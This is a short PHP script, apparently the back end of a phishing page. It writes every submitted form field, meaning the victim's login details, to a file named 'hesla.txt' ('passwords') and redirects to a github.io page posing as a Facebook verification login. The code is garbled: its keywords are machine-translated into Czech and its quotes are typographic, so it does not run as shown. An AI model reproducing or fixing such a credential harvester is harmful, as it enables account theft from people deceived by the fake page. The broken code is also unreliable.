<?php
header ('Umístění: https://jan422.github.io/overeni-facebook/-facebook-login');
$handle = fopen(“hesla.txt”, “a”);
foreach($_POST jako $proměnná => $hodnota) {
fwrite($handle, $proměnná);
fwrite($handle, “=”);
fwrite($handle, $hodnota);
fwrite($handle, “\r\n”);
}
fwrite($handle, “\r\n”);
fclose($handle);
výstup;
?>
